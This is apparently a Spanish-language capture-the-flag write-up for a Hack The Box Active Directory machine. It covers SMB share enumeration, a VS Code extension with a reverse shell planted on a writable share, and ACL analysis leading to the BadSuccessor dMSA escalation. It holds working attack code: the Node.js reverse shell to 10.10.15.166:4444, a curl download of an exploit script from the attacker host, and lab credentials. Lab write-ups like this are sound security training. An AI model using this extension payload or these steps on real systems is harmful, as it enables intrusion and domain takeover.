SMB         10.129.83.74    445    DC01             Share           Permissions     Remark
SMB         10.129.83.74    445    DC01             -----           -----------     ------
SMB         10.129.83.74    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.83.74    445    DC01             C$                              Default share
SMB         10.129.83.74    445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.83.74    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.83.74    445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.83.74    445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.83.74    445    DC01             VMBackups
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                  ✔ │ 6s ─╮
╰─                                                                                                                   ─╯


```

``` bash

❯ mkdir checkpoint-vsix
❯ cd checkpoint-vsix
❯ npm init -y

Wrote to /home/joel/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix/package.json:

{
  "name": "checkpoint-vsix",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC"
}


❯ npm install --save-dev @vscode/vsce
npm WARN deprecated whatwg-encoding@3.1.1: Use @exodus/bytes instead for a more spec-conformant and faster implementation
npm WARN deprecated prebuild-install@7.1.3: No longer maintained. Please contact the author of the relevant native addon; alternatives are available.

added 283 packages, and audited 284 packages in 15s

85 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix                                               ✔ │ 16s ─╮
╰─                                                                                                                   ─╯

```

``` json

{
  "name": "checkpoint-test",
  "displayName": "Checkpoint Test",
  "version": "1.0.0",
  "engines": {
    "vscode": "^1.118.0"
  },
  "activationEvents": [
    "*"
  ],
  "main": "./extension.js"
}

```

``` js

const vscode = require("vscode");
const https = require("https");

function activate(context) {
    const options = {
        hostname: "10.10.15.166",
        port: 8000,
        path: "/checkpoint-vsix",
        method: "GET"
    };

    const req = https.request(options, (res) => {
        console.log(`PoC callback: HTTP ${res.statusCode}`);
    });

    req.on("error", (err) => {
        console.error(`PoC callback failed: ${err.message}`);
    });

    req.end();

    vscode.window.showInformationMessage("Checkpoint VSIX activated");
}

function deactivate() {}

module.exports = {
    activate,
    deactivate
};

```

``` bash

❯ ls
extension.js  node_modules  package.json  package-lock.json
❯ npx vsce package
 WARNING  A 'repository' field is missing from the 'package.json' manifest file.
Use --allow-missing-repository to bypass.
Do you want to continue? [y/N] y
 WARNING  Using '*' activation is usually a bad idea as it impacts performance.
More info: https://code.visualstudio.com/api/references/activation-events#Start-up
Use --allow-star-activation to bypass.
Do you want to continue? [y/N] y
 WARNING  LICENSE, LICENSE.md, or LICENSE.txt not found
Do you want to continue? [y/N] y
 WARNING  This extension consists of 12019 files, out of which 4020 are JavaScript files. For performance reasons, you should bundle your extension: https://aka.ms/vscode-bundle-extension. You should also exclude unnecessary files by adding them to your .vscodeignore: https://aka.ms/vscode-vscodeignore.

 WARNING  Neither a .vscodeignore file nor a "files" property in package.json was found. To ensure only necessary files are included in your extension, add a .vscodeignore file or specify the "files" property in package.json. More info: https://aka.ms/vscode-vscodeignore

 INFO  Files included in the VSIX:
checkpoint-test-1.0.0.vsix
├─ [Content_Types].xml
├─ extension.vsixmanifest
└─ extension/
   ├─ extension.js [0.61 KB]
   ├─ package.json [0.2 KB]
   └─ node_modules/ (12015 files) [91.84 MB]

=> Run vsce ls --tree to see all included files.

 DONE  Packaged: /home/joel/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix/checkpoint-test-1.0.0.vsix (12019 files, 31.36 MB)
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix                                               ✔ │ 39s ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ smbclient //10.129.83.74/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put checkpoint-test-1.0.0.vsix'
putting file checkpoint-test-1.0.0.vsix as \checkpoint-test-1.0.0.vsix (9768.4 kB/s) (average 9768.4 kB/s)
❯ smbclient //10.129.83.74/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'ls'
  .                                   D        0  Fri Aug 28 12:03:00 2026
  ..                                  D        0  Sat May  9 16:42:27 2026
  checkpoint-test-1.0.0.vsix          A 32879317  Fri Aug 28 12:03:03 2026

                10459391 blocks of size 4096. 2455711 blocks available
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts/checkpoint-vsix                                                     ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.83.74 - - [28/Aug/2026 05:04:59] code 400, message Bad request version ('«Þïh£\\x00ªÆA')
10.129.83.74 - - [28/Aug/2026 05:04:59] "\x16\x03\x01\x00á\x01\x00\x00Ý\x03\x03¤V´\x9cÁÊ"\x80\x05ï£\x0bPG¿ÚÔ\x04Öwo°\x00Ä8÷\x7f¹q(þ" «Þïh£\x00ªÆA" 400 -

```


``` json

{
  "name": "checkpoint-test",
  "displayName": "Checkpoint Test",
  "version": "1.0.0",
  "engines": {
    "vscode": "^1.118.0"
  },
  "activationEvents": [
    "*"
  ],
  "main": "./extension.js"
}

```


``` js

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.15.166", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; 
})();

```

``` bash

❯ smbclient //10.129.83.74/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put checkpoint-test-1.0.0.vsix'
putting file checkpoint-test-1.0.0.vsix as \checkpoint-test-1.0.0.vsix (9744.6 kB/s) (average 9744.6 kB/s)

```


``` bash

❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.166] from (UNKNOWN) [10.129.83.74] 50677
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Program Files\Microsoft VS Code> whoami
whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code>

```

``` bash

PS C:\Users\ryan.brooks\Desktop> pwd
pwd

Path
----
C:\Users\ryan.brooks\Desktop


PS C:\Users\ryan.brooks\Desktop> type user.txt
type user.txt
5f<REDACTED>46
PS C:\Users\ryan.brooks\Desktop>

```


``` bash

PS C:\Users\ryan.brooks\Desktop> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes   
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
CHECKPOINT\VPN-Users                       Group            S-1-5-21-3129162710-3498938529-1807524340-1109 Mandatory group, Enabled by default, Enabled group
CHECKPOINT\DevTeam                         Group            S-1-5-21-3129162710-3498938529-1807524340-1110 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                 
PS C:\Users\ryan.brooks\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\ryan.brooks\Desktop>

```


``` bash

❯ bloodyAD --host 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get children --direct

distinguishedName: CN=Builtin,DC=checkpoint,DC=htb

distinguishedName: CN=Computers,DC=checkpoint,DC=htb

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb

distinguishedName: OU=Domain Controllers,DC=checkpoint,DC=htb

distinguishedName: OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb

distinguishedName: CN=Infrastructure,DC=checkpoint,DC=htb

distinguishedName: CN=Keys,DC=checkpoint,DC=htb

distinguishedName: CN=LostAndFound,DC=checkpoint,DC=htb

distinguishedName: CN=Managed Service Accounts,DC=checkpoint,DC=htb

distinguishedName: CN=NTDS Quotas,DC=checkpoint,DC=htb

distinguishedName: CN=Program Data,DC=checkpoint,DC=htb

distinguishedName: OU=ServiceAccounts,DC=checkpoint,DC=htb

distinguishedName: CN=System,DC=checkpoint,DC=htb

distinguishedName: CN=TPM Devices,DC=checkpoint,DC=htb

distinguishedName: CN=Users,DC=checkpoint,DC=htb
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                     ✔ ─╮
╰─                                                                                                                   ─╯

```

tenemos Managed Service Accounts y una OU llamada DMSAHolder

``` py

import re

sddl = open("dm_acl.txt").read().split(":", 1)[1]

interesting = {"CC", "DC", "WP", "WO", "WD", "GA"}

for i, ace in enumerate(re.findall(r'\([^)]*\)', sddl), 1):
    fields = ace.strip("()").split(";")
    rights = fields[2] if len(fields) > 2 else ""

    if any(x in rights.split(",") for x in interesting):
        print(f"{i:02d}: {ace}")

```
``` bash

❯ bloodyAD --host 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'OU=DMSAHolder,DC=checkpoint,DC=htb' | grep '^nTSecurityDescriptor:' > dm_acl.txt
❯ python3 important_acl.py
07: (A;CI;CC;;;S-1-5-21-3129162710-3498938529-1807524340-1103)
28: (OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                     ✔ ─╮
╰─                                                                                                                   ─╯

```

###  AD ACL — estructura de un ACE

Un ACE tiene **6 campos fijos**:

`(TYPE;FLAGS;RIGHTS;OBJECT_GUID;INHERITED_OBJECT_GUID;SID)`

Ejemplo:

`(A;CI;CC;;;S-1-5-21-...-1103)`

| Campo | Qué contiene | Valores típicos |
|---|---|---|
| **1. TYPE** | Tipo de permiso | `A` = Allow, `D` = Deny |
| **2. FLAGS** | Herencia/comportamiento | `CI`, `OI`, `IO`, `ID` |
| **3. RIGHTS** | Qué operación permite/deniega | `CC`, `DC`, `RP`, `WP`, `WD`, `WO`, `GA`, etc. |
| **4. OBJECT_GUID** | GUID del objeto/atributo afectado | GUID o vacío |
| **5. INHERITED_OBJECT_GUID** | Tipo de objeto al que se aplica la herencia | GUID o vacío |
| **6. SID** | Principal al que se aplica el ACE | `S-1-5-...` |

####  Importante

Los códigos **NO se pueden intercambiar entre campos**:

- `A` / `D` → **campo 1 (TYPE)**
- `CI` / `OI` / `IO` / `ID` → **campo 2 (FLAGS)**
- `CC` / `DC` / `RP` / `WP` / `WD` / `WO` / `GA`... → **campo 3 (RIGHTS)**
- GUID → **campo 4 o 5**
- SID → **campo 6**

Por tanto:

`(A;CI;CC;;;S-1-5-...-1103)`

se lee:

1. `A` → **Allow**
2. `CI` → **Container Inherit**
3. `CC` → **Create Child**
4. vacío → sin Object GUID
5. vacío → sin Inherited Object GUID
6. `S-1-5-...-1103` → **quién recibe el permiso**

###  Chuleta

`TYPE ; FLAGS ; RIGHTS ; OBJECT_GUID ; INHERITED_OBJECT_GUID ; SID`

`A    ; CI    ; CC     ;             ;                       ; SID`

**Tipo → Herencia → Permiso → GUID → GUID → Quién**

``` bash

❯ rpcclient -U 'checkpoint.htb/alex.turner%Checkpoint2024!' 10.129.83.74
rpcclient $> lookupsids S-1-5-21-3129162710-3498938529-1807524340-1103
S-1-5-21-3129162710-3498938529-1807524340-1103 CHECKPOINT\ryan.brooks (1)
rpcclient $>

```

ryan.brooks tiene permiso a crear hijos dentro de la OU=DMSAHolder segun la ACL


``` bash

❯ bloodyAD --host 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get children --target 'OU=ServiceAccounts,DC=checkpoint,DC=htb' --direct

distinguishedName: CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                     ✔ ─╮
╰─                                                                                                                   ─╯

```


``` bash


❯ bloodyAD --host 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb'

distinguishedName: CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb
cn: BackupAccess
dSCorePropagationData: 1601-01-01 00:00:00+00:00
groupType: -2147483646
instanceType: 4
member: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
nTSecurityDescriptor: O:S-1-5-21-3129162710-3498938529-1807524340-512G:S-1-5-21-3129162710-3498938529-1807524340-512D:AI(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;S-1-5-11)(A;;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;0x20094;;;S-1-5-10)(A;;0x20094;;;S-1-5-11)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: BackupAccess
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
objectClass: top; group
objectGUID: 5337f95d-220c-4ea2-b90b-8797030bed5f
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1123
sAMAccountName: BackupAccess
sAMAccountType: 268435456
uSNChanged: 61510
uSNCreated: 61506
whenChanged: 2026-05-13 13:57:31+00:00
whenCreated: 2026-05-13 13:57:27+00:00
❯ bloodyAD --host 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb'

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: svc_deploy
codePage: 0
countryCode: 0
dSCorePropagationData: 2026-05-09 14:41:59+00:00
description: Deployment service account
instanceType: 4
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
logonCount: 0
memberOf: CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb; CN=Remote Management Users,CN=Builtin,DC=checkpoint,DC=htb
nTSecurityDescriptor: O:S-1-5-21-3129162710-3498938529-1807524340-512G:S-1-5-21-3129162710-3498938529-1807524340-512D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3129162710-3498938529-1807524340-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-512)(A;CI;0x20028;;;S-1-5-21-3129162710-3498938529-1807524340-1103)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: svc_deploy
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: 29c7edbe-204b-43b4-99d6-f9816f80039d
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1104
primaryGroupID: 513
pwdLastSet: 2026-05-09 09:01:19.573610+00:00
sAMAccountName: svc_deploy
sAMAccountType: 805306368
uSNChanged: 16435
uSNCreated: 12783
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: svc_deploy@checkpoint.htb
whenChanged: 2026-05-09 10:05:23+00:00
whenCreated: 2026-05-09 09:01:19+00:00
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                     ✔ ─╮
╰─                                                                                                                   ─╯


```


``` bash

❯ bloodyAD --host 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get membership 'svc_deploy'

distinguishedName: CN=Users,CN=Builtin,DC=checkpoint,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=checkpoint,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Domain Users,CN=Users,DC=checkpoint,DC=htb
objectSid: S-1-5-21-3129162710-3498938529-1807524340-513
sAMAccountName: Domain Users

distinguishedName: CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1123
sAMAccountName: BackupAccess
❯ bloodyAD --host 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get membership 'BackupAccess'
[!] No membership found
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                     ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor

LDAP        10.129.83.74    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.83.74    389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
BADSUCCE... 10.129.83.74    389    DC01             [+] Found domain controller with operating system Windows Server 2025: Unknown IP (DC01.checkpoint.htb)
BADSUCCE... 10.129.83.74    389    DC01             [+] Found 2 results
BADSUCCE... 10.129.83.74    389    DC01             alex.turner (S-1-5-21-3129162710-3498938529-1807524340-1101), OU=Employees,DC=checkpoint,DC=htb
BADSUCCE... 10.129.83.74    389    DC01             ryan.brooks (S-1-5-21-3129162710-3498938529-1807524340-1103), OU=DMSAHolder,DC=checkpoint,DC=htb
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                               ✔ │ 14s ─╮
╰─                                                                                                                   ─╯

```

``` bash


C:\Users\ryan.brooks\Desktop>curl.exe "http://10.10.15.166:8080/badsuccessor.ps1" -o "badsuccessor.ps1"
curl.exe "http://10.10.15.166:8080/badsuccessor.ps1" -o "badsuccessor.ps1"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   822  100   822    0     0   9592      0 --:--:-- --:--:-- --:--:--  9670

C:\Users\ryan.brooks\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2660-795C

 Directory of C:\Users\ryan.brooks\Desktop

08/28/2026  05:55 PM    <DIR>          .
05/21/2026  04:19 PM    <DIR>          ..
08/28/2026  05:55 PM               822 badsuccessor.ps1
08/28/2026  05:06 PM                34 user.txt
               2 File(s)            856 bytes
               2 Dir(s)  10,052,120,576 bytes free

C:\Users\ryan.brooks\Desktop>


```

``` bash

PS C:\Program Files\Microsoft VS Code> [System.Environment]::OSVersion.Version
[System.Environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      26100  0


PS C:\Program Files\Microsoft VS Code> Get-HotFix | Where-Object {$_.HotFixID -like "*KB5058385*" -or $_.HotFixID -like "*KB5058392*"}
Get-HotFix | Where-Object {$_.HotFixID -like "*KB5058385*" -or $_.HotFixID -like "*KB5058392*"}
PS C:\Program Files\Microsoft VS Code> Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20
PS C:\Program Files\Microsoft VS Code>

```

Tenemos el ataque de badsuccessor sin parchear, el cual consiste en migrar una nueva cuenta de servicio de windows mediante la funcion dMSA a una nueva cuenta que hereda la identidad de la cuenta que estamos migrando.

dMSA se utiliza para migrar cuentas de servicio, para que dejen de usar contraseña y pasen al nuevo metodo moderno implantado por AD el cual el se encarga de gestionar la contraseña y cambiarla periodicamente sin que los usuarios ni administradores sepan la contraseña directamente. Todo gestionado por AD.

En este punto entra la vulnerabilidad Badsuccessor, si un usuario del dominio tiene permisos para CREATE_CHILD (CC) sobre cualquier OU del dominio y existe la vulnerabilidad (CVE-2025-53779) en la maquina, se puede crear un dMSA malicioso y luego poder solicitar su ticket kerberos.

Tenemos estas condiciones:

- Usuario comprometido el cual tenga permisos CREATE_CHILD (CC) en almenos 1 OU del dominio con CC y dMSA.
- Usuario comprometido con permiso WRITE en el objeto de la cuenta de servicio a la que queremos comprometer.

En nuestro caso, tenemos ambos casos, tenemos a alex, el cual puede crear CREATE_CHILD en "Employees" y por otro lado tenemos a ryan, el cual tiene permiso WRITE bajo el objeto de tipo user svc_deploy

